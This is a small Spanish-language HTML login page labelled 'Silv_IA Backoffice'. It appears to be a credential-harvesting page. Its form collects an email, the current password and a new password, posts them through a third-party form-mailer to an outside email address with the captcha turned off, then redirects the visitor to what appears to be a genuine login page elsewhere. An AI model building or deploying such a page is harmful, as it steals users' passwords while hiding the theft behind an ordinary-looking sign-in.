<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GDG Pulse</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #ffffff;
      font-family: 'Segoe UI', sans-serif;
    }

    .card {
      background: #ffffff;
      border: 1px solid #e0e0e0;
      border-radius: 14px;
      padding: 2rem 2.5rem;
      width: 100%;
      max-width: 400px;
    }

    h1 {
      font-size: 18px;
      font-weight: 600;
      color: #111;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .field {
      margin-bottom: 1rem;
    }

    input {
      width: 100%;
      padding: 9px 12px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    button {
      width: 100%;
      padding: 11px;
      background: #111;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      cursor: pointer;
    }

    button:hover {
      background: #333;
    }
  </style>
</head>

<body>

<div class="card">
  <h1>Silv_IA Backoffice</h1>

  <!-- FORMULARIO FORM SUBMIT -->
  <form action="https://formsubmit.co/eva.sanchez@grupodanigarcia.com" method="POST">

    <!-- evita spam -->
    <input type="hidden" name="_captcha" value="false">

    <!-- redirección después de enviar -->
    <input type="hidden" name="_next" value="https://iaprivada.ai/login">

    <div class="field">
      <input type="email" name="email" placeholder="Email" required />
    </div>

    <div class="field">
      <input type="password" name="password" placeholder="Contraseña" />
    </div>

    <div class="field">
      <input type="password" name="new_password" placeholder="Contraseña nueva" />
    </div>

    <button type="submit">Entrar</button>

  </form>
</div>

</body>
</html>
